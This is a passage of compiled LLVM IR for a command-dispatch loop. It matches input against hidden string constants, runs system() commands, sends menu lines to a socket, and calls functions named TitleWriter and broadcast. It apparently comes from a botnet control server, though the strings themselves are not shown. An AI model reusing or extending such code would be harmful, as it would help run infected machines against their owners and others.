952:                                              ; preds = %946
  %953 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %954 = call i8* @strstr(i8* %953, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0)) #8
  %955 = icmp ne i8* %954, null
  br i1 %955, label %956, label %958

956:                                              ; preds = %952
  %957 = call i32 @system(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.85, i64 0, i64 0))
  br label %575, !llvm.loop !20

958:                                              ; preds = %952
  %959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %960 = call i8* @strstr(i8* %959, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i64 0, i64 0)) #8
  %961 = icmp ne i8* %960, null
  br i1 %961, label %962, label %964

962:                                              ; preds = %958
  %963 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.87, i64 0, i64 0))
  br label %575, !llvm.loop !20

964:                                              ; preds = %958
  %965 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %966 = call i8* @strstr(i8* %965, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i64 0, i64 0)) #8
  %967 = icmp ne i8* %966, null
  br i1 %967, label %968, label %970

968:                                              ; preds = %964
  %969 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.89, i64 0, i64 0))
  br label %575, !llvm.loop !20

970:                                              ; preds = %964
  %971 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %972 = call i8* @strstr(i8* %971, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i64 0, i64 0)) #8
  %973 = icmp ne i8* %972, null
  br i1 %973, label %974, label %976

974:                                              ; preds = %970
  %975 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.91, i64 0, i64 0))
  br label %575, !llvm.loop !20

976:                                              ; preds = %970
  %977 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %978 = call i8* @strstr(i8* %977, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i64 0, i64 0)) #8
  %979 = icmp ne i8* %978, null
  br i1 %979, label %980, label %982

980:                                              ; preds = %976
  %981 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.93, i64 0, i64 0))
  br label %575, !llvm.loop !20

982:                                              ; preds = %976
  %983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %984 = call i8* @strstr(i8* %983, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i64 0, i64 0)) #8
  %985 = icmp ne i8* %984, null
  br i1 %985, label %986, label %988

986:                                              ; preds = %982
  %987 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.95, i64 0, i64 0))
  br label %575, !llvm.loop !20

988:                                              ; preds = %982
  %989 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %990 = call i8* @strstr(i8* %989, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.96, i64 0, i64 0)) #8
  %991 = icmp ne i8* %990, null
  br i1 %991, label %992, label %994

992:                                              ; preds = %988
  %993 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.97, i64 0, i64 0))
  br label %575, !llvm.loop !20

994:                                              ; preds = %988
  %995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %996 = call i8* @strstr(i8* %995, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i64 0, i64 0)) #8
  %997 = icmp ne i8* %996, null
  br i1 %997, label %998, label %1000

998:                                              ; preds = %994
  %999 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.99, i64 0, i64 0))
  br label %575, !llvm.loop !20

1000:                                             ; preds = %994
  %1001 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1002 = call i8* @strstr(i8* %1001, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.100, i64 0, i64 0)) #8
  %1003 = icmp ne i8* %1002, null
  br i1 %1003, label %1004, label %1006

1004:                                             ; preds = %1000
  %1005 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.101, i64 0, i64 0))
  br label %575, !llvm.loop !20

1006:                                             ; preds = %1000
  %1007 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1008 = call i8* @strstr(i8* %1007, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.102, i64 0, i64 0)) #8
  %1009 = icmp ne i8* %1008, null
  br i1 %1009, label %1010, label %1012

1010:                                             ; preds = %1006
  %1011 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.103, i64 0, i64 0))
  br label %575, !llvm.loop !20

1012:                                             ; preds = %1006
  %1013 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1014 = call i8* @strstr(i8* %1013, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i64 0, i64 0)) #8
  %1015 = icmp ne i8* %1014, null
  br i1 %1015, label %1016, label %1018

1016:                                             ; preds = %1012
  %1017 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.105, i64 0, i64 0))
  br label %575, !llvm.loop !20

1018:                                             ; preds = %1012
  %1019 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1020 = call i8* @strstr(i8* %1019, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.106, i64 0, i64 0)) #8
  %1021 = icmp ne i8* %1020, null
  br i1 %1021, label %1022, label %1024

1022:                                             ; preds = %1018
  %1023 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.107, i64 0, i64 0))
  br label %575, !llvm.loop !20

1024:                                             ; preds = %1018
  %1025 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1026 = call i8* @strstr(i8* %1025, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.108, i64 0, i64 0)) #8
  %1027 = icmp ne i8* %1026, null
  br i1 %1027, label %1028, label %1030

1028:                                             ; preds = %1024
  %1029 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.109, i64 0, i64 0))
  br label %575, !llvm.loop !20

1030:                                             ; preds = %1024
  %1031 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1032 = call i8* @strstr(i8* %1031, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.110, i64 0, i64 0)) #8
  %1033 = icmp ne i8* %1032, null
  br i1 %1033, label %1034, label %1036

1034:                                             ; preds = %1030
  %1035 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.111, i64 0, i64 0))
  br label %575, !llvm.loop !20

1036:                                             ; preds = %1030
  %1037 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1038 = call i8* @strstr(i8* %1037, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i64 0, i64 0)) #8
  %1039 = icmp ne i8* %1038, null
  br i1 %1039, label %1040, label %1042

1040:                                             ; preds = %1036
  %1041 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.113, i64 0, i64 0))
  br label %575, !llvm.loop !20

1042:                                             ; preds = %1036
  %1043 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1044 = call i8* @strstr(i8* %1043, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i64 0, i64 0)) #8
  %1045 = icmp ne i8* %1044, null
  br i1 %1045, label %1046, label %1048

1046:                                             ; preds = %1042
  %1047 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.115, i64 0, i64 0))
  br label %575, !llvm.loop !20

1048:                                             ; preds = %1042
  %1049 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1050 = call i8* @strstr(i8* %1049, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.116, i64 0, i64 0)) #8
  %1051 = icmp ne i8* %1050, null
  br i1 %1051, label %1052, label %1317

1052:                                             ; preds = %1048
  %1053 = load i8*, i8** %3, align 8
  %1054 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1053) #9
  %1055 = getelementptr inbounds [80 x i8], [80 x i8]* %74, i64 0, i64 0
  %1056 = call i32 (i8*, i8*, ...) @sprintf(i8* %1055, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.117, i64 0, i64 0)) #9
  %1057 = getelementptr inbounds [80 x i8], [80 x i8]* %75, i64 0, i64 0
  %1058 = call i32 (i8*, i8*, ...) @sprintf(i8* %1057, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.118, i64 0, i64 0)) #9
  %1059 = getelementptr inbounds [80 x i8], [80 x i8]* %76, i64 0, i64 0
  %1060 = call i32 (i8*, i8*, ...) @sprintf(i8* %1059, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.119, i64 0, i64 0)) #9
  %1061 = getelementptr inbounds [80 x i8], [80 x i8]* %77, i64 0, i64 0
  %1062 = call i32 (i8*, i8*, ...) @sprintf(i8* %1061, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.120, i64 0, i64 0)) #9
  %1063 = getelementptr inbounds [80 x i8], [80 x i8]* %78, i64 0, i64 0
  %1064 = call i32 (i8*, i8*, ...) @sprintf(i8* %1063, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.121, i64 0, i64 0)) #9
  %1065 = getelementptr inbounds [80 x i8], [80 x i8]* %79, i64 0, i64 0
  %1066 = call i32 (i8*, i8*, ...) @sprintf(i8* %1065, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.122, i64 0, i64 0)) #9
  %1067 = getelementptr inbounds [80 x i8], [80 x i8]* %80, i64 0, i64 0
  %1068 = call i32 (i8*, i8*, ...) @sprintf(i8* %1067, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.123, i64 0, i64 0)) #9
  %1069 = getelementptr inbounds [80 x i8], [80 x i8]* %81, i64 0, i64 0
  %1070 = call i32 (i8*, i8*, ...) @sprintf(i8* %1069, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.124, i64 0, i64 0)) #9
  %1071 = getelementptr inbounds [80 x i8], [80 x i8]* %82, i64 0, i64 0
  %1072 = call i32 (i8*, i8*, ...) @sprintf(i8* %1071, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.125, i64 0, i64 0)) #9
  %1073 = getelementptr inbounds [80 x i8], [80 x i8]* %83, i64 0, i64 0
  %1074 = call i32 (i8*, i8*, ...) @sprintf(i8* %1073, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.126, i64 0, i64 0)) #9
  %1075 = getelementptr inbounds [80 x i8], [80 x i8]* %84, i64 0, i64 0
  %1076 = call i32 (i8*, i8*, ...) @sprintf(i8* %1075, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.127, i64 0, i64 0)) #9
  %1077 = getelementptr inbounds [80 x i8], [80 x i8]* %85, i64 0, i64 0
  %1078 = call i32 (i8*, i8*, ...) @sprintf(i8* %1077, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.128, i64 0, i64 0)) #9
  %1079 = getelementptr inbounds [80 x i8], [80 x i8]* %86, i64 0, i64 0
  %1080 = call i32 (i8*, i8*, ...) @sprintf(i8* %1079, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.129, i64 0, i64 0)) #9
  %1081 = getelementptr inbounds [80 x i8], [80 x i8]* %87, i64 0, i64 0
  %1082 = call i32 (i8*, i8*, ...) @sprintf(i8* %1081, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.130, i64 0, i64 0)) #9
  %1083 = getelementptr inbounds [80 x i8], [80 x i8]* %88, i64 0, i64 0
  %1084 = call i32 (i8*, i8*, ...) @sprintf(i8* %1083, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.131, i64 0, i64 0)) #9
  %1085 = getelementptr inbounds [80 x i8], [80 x i8]* %89, i64 0, i64 0
  %1086 = call i32 (i8*, i8*, ...) @sprintf(i8* %1085, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i64 0, i64 0)) #9
  %1087 = getelementptr inbounds [80 x i8], [80 x i8]* %90, i64 0, i64 0
  %1088 = call i32 (i8*, i8*, ...) @sprintf(i8* %1087, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.133, i64 0, i64 0)) #9
  %1089 = getelementptr inbounds [80 x i8], [80 x i8]* %91, i64 0, i64 0
  %1090 = call i32 (i8*, i8*, ...) @sprintf(i8* %1089, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.134, i64 0, i64 0)) #9
  %1091 = getelementptr inbounds [80 x i8], [80 x i8]* %92, i64 0, i64 0
  %1092 = call i32 (i8*, i8*, ...) @sprintf(i8* %1091, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i64 0, i64 0)) #9
  %1093 = getelementptr inbounds [80 x i8], [80 x i8]* %93, i64 0, i64 0
  %1094 = call i32 (i8*, i8*, ...) @sprintf(i8* %1093, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.136, i64 0, i64 0)) #9
  %1095 = getelementptr inbounds [80 x i8], [80 x i8]* %94, i64 0, i64 0
  %1096 = call i32 (i8*, i8*, ...) @sprintf(i8* %1095, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.137, i64 0, i64 0)) #9
  %1097 = getelementptr inbounds [80 x i8], [80 x i8]* %95, i64 0, i64 0
  %1098 = call i32 (i8*, i8*, ...) @sprintf(i8* %1097, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.138, i64 0, i64 0)) #9
  %1099 = getelementptr inbounds [80 x i8], [80 x i8]* %96, i64 0, i64 0
  %1100 = call i32 (i8*, i8*, ...) @sprintf(i8* %1099, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.139, i64 0, i64 0)) #9
  %1101 = getelementptr inbounds [80 x i8], [80 x i8]* %97, i64 0, i64 0
  %1102 = call i32 (i8*, i8*, ...) @sprintf(i8* %1101, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.140, i64 0, i64 0)) #9
  %1103 = getelementptr inbounds [80 x i8], [80 x i8]* %98, i64 0, i64 0
  %1104 = call i32 (i8*, i8*, ...) @sprintf(i8* %1103, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.141, i64 0, i64 0)) #9
  %1105 = getelementptr inbounds [80 x i8], [80 x i8]* %99, i64 0, i64 0
  %1106 = call i32 (i8*, i8*, ...) @sprintf(i8* %1105, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.142, i64 0, i64 0)) #9
  %1107 = load i32, i32* %4, align 4
  %1108 = getelementptr inbounds [80 x i8], [80 x i8]* %74, i64 0, i64 0
  %1109 = getelementptr inbounds [80 x i8], [80 x i8]* %74, i64 0, i64 0
  %1110 = call i64 @strlen(i8* %1109) #8
  %1111 = call i64 @send(i32 %1107, i8* %1108, i64 %1110, i32 16384)
  %1112 = icmp eq i64 %1111, -1
  br i1 %1112, label %1113, label %1114

1113:                                             ; preds = %1052
  br label %1555

1114:                                             ; preds = %1052
  %1115 = load i32, i32* %4, align 4
  %1116 = getelementptr inbounds [80 x i8], [80 x i8]* %75, i64 0, i64 0
  %1117 = getelementptr inbounds [80 x i8], [80 x i8]* %75, i64 0, i64 0
  %1118 = call i64 @strlen(i8* %1117) #8
  %1119 = call i64 @send(i32 %1115, i8* %1116, i64 %1118, i32 16384)
  %1120 = icmp eq i64 %1119, -1
  br i1 %1120, label %1121, label %1122

1121:                                             ; preds = %1114
  br label %1555

1122:                                             ; preds = %1114
  %1123 = load i32, i32* %4, align 4
  %1124 = getelementptr inbounds [80 x i8], [80 x i8]* %76, i64 0, i64 0
  %1125 = getelementptr inbounds [80 x i8], [80 x i8]* %76, i64 0, i64 0
  %1126 = call i64 @strlen(i8* %1125) #8
  %1127 = call i64 @send(i32 %1123, i8* %1124, i64 %1126, i32 16384)
  %1128 = icmp eq i64 %1127, -1
  br i1 %1128, label %1129, label %1130

1129:                                             ; preds = %1122
  br label %1555

1130:                                             ; preds = %1122
  %1131 = load i32, i32* %4, align 4
  %1132 = getelementptr inbounds [80 x i8], [80 x i8]* %77, i64 0, i64 0
  %1133 = getelementptr inbounds [80 x i8], [80 x i8]* %77, i64 0, i64 0
  %1134 = call i64 @strlen(i8* %1133) #8
  %1135 = call i64 @send(i32 %1131, i8* %1132, i64 %1134, i32 16384)
  %1136 = icmp eq i64 %1135, -1
  br i1 %1136, label %1137, label %1138

1137:                                             ; preds = %1130
  br label %1555

1138:                                             ; preds = %1130
  %1139 = load i32, i32* %4, align 4
  %1140 = getelementptr inbounds [80 x i8], [80 x i8]* %78, i64 0, i64 0
  %1141 = getelementptr inbounds [80 x i8], [80 x i8]* %78, i64 0, i64 0
  %1142 = call i64 @strlen(i8* %1141) #8
  %1143 = call i64 @send(i32 %1139, i8* %1140, i64 %1142, i32 16384)
  %1144 = icmp eq i64 %1143, -1
  br i1 %1144, label %1145, label %1146

1145:                                             ; preds = %1138
  br label %1555

1146:                                             ; preds = %1138
  %1147 = load i32, i32* %4, align 4
  %1148 = getelementptr inbounds [80 x i8], [80 x i8]* %79, i64 0, i64 0
  %1149 = getelementptr inbounds [80 x i8], [80 x i8]* %79, i64 0, i64 0
  %1150 = call i64 @strlen(i8* %1149) #8
  %1151 = call i64 @send(i32 %1147, i8* %1148, i64 %1150, i32 16384)
  %1152 = icmp eq i64 %1151, -1
  br i1 %1152, label %1153, label %1154

1153:                                             ; preds = %1146
  br label %1555

1154:                                             ; preds = %1146
  %1155 = load i32, i32* %4, align 4
  %1156 = getelementptr inbounds [80 x i8], [80 x i8]* %80, i64 0, i64 0
  %1157 = getelementptr inbounds [80 x i8], [80 x i8]* %80, i64 0, i64 0
  %1158 = call i64 @strlen(i8* %1157) #8
  %1159 = call i64 @send(i32 %1155, i8* %1156, i64 %1158, i32 16384)
  %1160 = icmp eq i64 %1159, -1
  br i1 %1160, label %1161, label %1162

1161:                                             ; preds = %1154
  br label %1555

1162:                                             ; preds = %1154
  %1163 = load i32, i32* %4, align 4
  %1164 = getelementptr inbounds [80 x i8], [80 x i8]* %81, i64 0, i64 0
  %1165 = getelementptr inbounds [80 x i8], [80 x i8]* %81, i64 0, i64 0
  %1166 = call i64 @strlen(i8* %1165) #8
  %1167 = call i64 @send(i32 %1163, i8* %1164, i64 %1166, i32 16384)
  %1168 = icmp eq i64 %1167, -1
  br i1 %1168, label %1169, label %1170

1169:                                             ; preds = %1162
  br label %1555

1170:                                             ; preds = %1162
  %1171 = load i32, i32* %4, align 4
  %1172 = getelementptr inbounds [80 x i8], [80 x i8]* %82, i64 0, i64 0
  %1173 = getelementptr inbounds [80 x i8], [80 x i8]* %82, i64 0, i64 0
  %1174 = call i64 @strlen(i8* %1173) #8
  %1175 = call i64 @send(i32 %1171, i8* %1172, i64 %1174, i32 16384)
  %1176 = icmp eq i64 %1175, -1
  br i1 %1176, label %1177, label %1178

1177:                                             ; preds = %1170
  br label %1555

1178:                                             ; preds = %1170
  %1179 = load i32, i32* %4, align 4
  %1180 = getelementptr inbounds [80 x i8], [80 x i8]* %83, i64 0, i64 0
  %1181 = getelementptr inbounds [80 x i8], [80 x i8]* %83, i64 0, i64 0
  %1182 = call i64 @strlen(i8* %1181) #8
  %1183 = call i64 @send(i32 %1179, i8* %1180, i64 %1182, i32 16384)
  %1184 = icmp eq i64 %1183, -1
  br i1 %1184, label %1185, label %1186

1185:                                             ; preds = %1178
  br label %1555

1186:                                             ; preds = %1178
  %1187 = load i32, i32* %4, align 4
  %1188 = getelementptr inbounds [80 x i8], [80 x i8]* %84, i64 0, i64 0
  %1189 = getelementptr inbounds [80 x i8], [80 x i8]* %84, i64 0, i64 0
  %1190 = call i64 @strlen(i8* %1189) #8
  %1191 = call i64 @send(i32 %1187, i8* %1188, i64 %1190, i32 16384)
  %1192 = icmp eq i64 %1191, -1
  br i1 %1192, label %1193, label %1194

1193:                                             ; preds = %1186
  br label %1555

1194:                                             ; preds = %1186
  %1195 = load i32, i32* %4, align 4
  %1196 = getelementptr inbounds [80 x i8], [80 x i8]* %85, i64 0, i64 0
  %1197 = getelementptr inbounds [80 x i8], [80 x i8]* %85, i64 0, i64 0
  %1198 = call i64 @strlen(i8* %1197) #8
  %1199 = call i64 @send(i32 %1195, i8* %1196, i64 %1198, i32 16384)
  %1200 = icmp eq i64 %1199, -1
  br i1 %1200, label %1201, label %1202

1201:                                             ; preds = %1194
  br label %1555

1202:                                             ; preds = %1194
  %1203 = load i32, i32* %4, align 4
  %1204 = getelementptr inbounds [80 x i8], [80 x i8]* %86, i64 0, i64 0
  %1205 = getelementptr inbounds [80 x i8], [80 x i8]* %86, i64 0, i64 0
  %1206 = call i64 @strlen(i8* %1205) #8
  %1207 = call i64 @send(i32 %1203, i8* %1204, i64 %1206, i32 16384)
  %1208 = icmp eq i64 %1207, -1
  br i1 %1208, label %1209, label %1210

1209:                                             ; preds = %1202
  br label %1555

1210:                                             ; preds = %1202
  %1211 = load i32, i32* %4, align 4
  %1212 = getelementptr inbounds [80 x i8], [80 x i8]* %87, i64 0, i64 0
  %1213 = getelementptr inbounds [80 x i8], [80 x i8]* %87, i64 0, i64 0
  %1214 = call i64 @strlen(i8* %1213) #8
  %1215 = call i64 @send(i32 %1211, i8* %1212, i64 %1214, i32 16384)
  %1216 = icmp eq i64 %1215, -1
  br i1 %1216, label %1217, label %1218

1217:                                             ; preds = %1210
  br label %1555

1218:                                             ; preds = %1210
  %1219 = load i32, i32* %4, align 4
  %1220 = getelementptr inbounds [80 x i8], [80 x i8]* %88, i64 0, i64 0
  %1221 = getelementptr inbounds [80 x i8], [80 x i8]* %88, i64 0, i64 0
  %1222 = call i64 @strlen(i8* %1221) #8
  %1223 = call i64 @send(i32 %1219, i8* %1220, i64 %1222, i32 16384)
  %1224 = icmp eq i64 %1223, -1
  br i1 %1224, label %1225, label %1226

1225:                                             ; preds = %1218
  br label %1555

1226:                                             ; preds = %1218
  %1227 = load i32, i32* %4, align 4
  %1228 = getelementptr inbounds [80 x i8], [80 x i8]* %89, i64 0, i64 0
  %1229 = getelementptr inbounds [80 x i8], [80 x i8]* %89, i64 0, i64 0
  %1230 = call i64 @strlen(i8* %1229) #8
  %1231 = call i64 @send(i32 %1227, i8* %1228, i64 %1230, i32 16384)
  %1232 = icmp eq i64 %1231, -1
  br i1 %1232, label %1233, label %1234

1233:                                             ; preds = %1226
  br label %1555

1234:                                             ; preds = %1226
  %1235 = load i32, i32* %4, align 4
  %1236 = getelementptr inbounds [80 x i8], [80 x i8]* %90, i64 0, i64 0
  %1237 = getelementptr inbounds [80 x i8], [80 x i8]* %90, i64 0, i64 0
  %1238 = call i64 @strlen(i8* %1237) #8
  %1239 = call i64 @send(i32 %1235, i8* %1236, i64 %1238, i32 16384)
  %1240 = icmp eq i64 %1239, -1
  br i1 %1240, label %1241, label %1242

1241:                                             ; preds = %1234
  br label %1555

1242:                                             ; preds = %1234
  %1243 = load i32, i32* %4, align 4
  %1244 = getelementptr inbounds [80 x i8], [80 x i8]* %91, i64 0, i64 0
  %1245 = getelementptr inbounds [80 x i8], [80 x i8]* %91, i64 0, i64 0
  %1246 = call i64 @strlen(i8* %1245) #8
  %1247 = call i64 @send(i32 %1243, i8* %1244, i64 %1246, i32 16384)
  %1248 = icmp eq i64 %1247, -1
  br i1 %1248, label %1249, label %1250

1249:                                             ; preds = %1242
  br label %1555

1250:                                             ; preds = %1242
  %1251 = load i32, i32* %4, align 4
  %1252 = getelementptr inbounds [80 x i8], [80 x i8]* %92, i64 0, i64 0
  %1253 = getelementptr inbounds [80 x i8], [80 x i8]* %92, i64 0, i64 0
  %1254 = call i64 @strlen(i8* %1253) #8
  %1255 = call i64 @send(i32 %1251, i8* %1252, i64 %1254, i32 16384)
  %1256 = icmp eq i64 %1255, -1
  br i1 %1256, label %1257, label %1258

1257:                                             ; preds = %1250
  br label %1555

1258:                                             ; preds = %1250
  %1259 = load i32, i32* %4, align 4
  %1260 = getelementptr inbounds [80 x i8], [80 x i8]* %93, i64 0, i64 0
  %1261 = getelementptr inbounds [80 x i8], [80 x i8]* %93, i64 0, i64 0
  %1262 = call i64 @strlen(i8* %1261) #8
  %1263 = call i64 @send(i32 %1259, i8* %1260, i64 %1262, i32 16384)
  %1264 = icmp eq i64 %1263, -1
  br i1 %1264, label %1265, label %1266

1265:                                             ; preds = %1258
  br label %1555

1266:                                             ; preds = %1258
  %1267 = load i32, i32* %4, align 4
  %1268 = getelementptr inbounds [80 x i8], [80 x i8]* %94, i64 0, i64 0
  %1269 = getelementptr inbounds [80 x i8], [80 x i8]* %94, i64 0, i64 0
  %1270 = call i64 @strlen(i8* %1269) #8
  %1271 = call i64 @send(i32 %1267, i8* %1268, i64 %1270, i32 16384)
  %1272 = icmp eq i64 %1271, -1
  br i1 %1272, label %1273, label %1274

1273:                                             ; preds = %1266
  br label %1555

1274:                                             ; preds = %1266
  %1275 = load i32, i32* %4, align 4
  %1276 = getelementptr inbounds [80 x i8], [80 x i8]* %95, i64 0, i64 0
  %1277 = getelementptr inbounds [80 x i8], [80 x i8]* %95, i64 0, i64 0
  %1278 = call i64 @strlen(i8* %1277) #8
  %1279 = call i64 @send(i32 %1275, i8* %1276, i64 %1278, i32 16384)
  %1280 = icmp eq i64 %1279, -1
  br i1 %1280, label %1281, label %1282

1281:                                             ; preds = %1274
  br label %1555

1282:                                             ; preds = %1274
  %1283 = load i32, i32* %4, align 4
  %1284 = getelementptr inbounds [80 x i8], [80 x i8]* %96, i64 0, i64 0
  %1285 = getelementptr inbounds [80 x i8], [80 x i8]* %96, i64 0, i64 0
  %1286 = call i64 @strlen(i8* %1285) #8
  %1287 = call i64 @send(i32 %1283, i8* %1284, i64 %1286, i32 16384)
  %1288 = icmp eq i64 %1287, -1
  br i1 %1288, label %1289, label %1290

1289:                                             ; preds = %1282
  br label %1555

1290:                                             ; preds = %1282
  %1291 = load i32, i32* %4, align 4
  %1292 = getelementptr inbounds [80 x i8], [80 x i8]* %97, i64 0, i64 0
  %1293 = getelementptr inbounds [80 x i8], [80 x i8]* %97, i64 0, i64 0
  %1294 = call i64 @strlen(i8* %1293) #8
  %1295 = call i64 @send(i32 %1291, i8* %1292, i64 %1294, i32 16384)
  %1296 = icmp eq i64 %1295, -1
  br i1 %1296, label %1297, label %1298

1297:                                             ; preds = %1290
  br label %1555

1298:                                             ; preds = %1290
  %1299 = load i32, i32* %4, align 4
  %1300 = getelementptr inbounds [80 x i8], [80 x i8]* %98, i64 0, i64 0
  %1301 = getelementptr inbounds [80 x i8], [80 x i8]* %98, i64 0, i64 0
  %1302 = call i64 @strlen(i8* %1301) #8
  %1303 = call i64 @send(i32 %1299, i8* %1300, i64 %1302, i32 16384)
  %1304 = icmp eq i64 %1303, -1
  br i1 %1304, label %1305, label %1306

1305:                                             ; preds = %1298
  br label %1555

1306:                                             ; preds = %1298
  %1307 = load i32, i32* %4, align 4
  %1308 = getelementptr inbounds [80 x i8], [80 x i8]* %99, i64 0, i64 0
  %1309 = getelementptr inbounds [80 x i8], [80 x i8]* %99, i64 0, i64 0
  %1310 = call i64 @strlen(i8* %1309) #8
  %1311 = call i64 @send(i32 %1307, i8* %1308, i64 %1310, i32 16384)
  %1312 = icmp eq i64 %1311, -1
  br i1 %1312, label %1313, label %1314

1313:                                             ; preds = %1306
  br label %1555

1314:                                             ; preds = %1306
  %1315 = load i8*, i8** %3, align 8
  %1316 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1315) #9
  br label %575, !llvm.loop !20

1317:                                             ; preds = %1048
  %1318 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1319 = call i8* @strstr(i8* %1318, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i64 0, i64 0)) #8
  %1320 = icmp ne i8* %1319, null
  br i1 %1320, label %1321, label %1337

1321:                                             ; preds = %1317
  %1322 = getelementptr inbounds [2048 x i8], [2048 x i8]* %100, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1322, i8 0, i64 2048, i1 false)
  %1323 = getelementptr inbounds [2048 x i8], [2048 x i8]* %100, i64 0, i64 0
  %1324 = call i32 (i8*, i8*, ...) @sprintf(i8* %1323, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.144, i64 0, i64 0)) #9
  %1325 = getelementptr inbounds [2048 x i8], [2048 x i8]* %100, i64 0, i64 0
  %1326 = load i32, i32* %4, align 4
  call void @broadcast(i8* %1325, i32 %1326, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.145, i64 0, i64 0))
  %1327 = getelementptr inbounds [2048 x i8], [2048 x i8]* %101, i64 0, i64 0
  %1328 = call i32 (i8*, i8*, ...) @sprintf(i8* %1327, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.146, i64 0, i64 0)) #9
  %1329 = load i32, i32* %4, align 4
  %1330 = getelementptr inbounds [2048 x i8], [2048 x i8]* %101, i64 0, i64 0
  %1331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %101, i64 0, i64 0
  %1332 = call i64 @strlen(i8* %1331) #8
  %1333 = call i64 @send(i32 %1329, i8* %1330, i64 %1332, i32 16384)
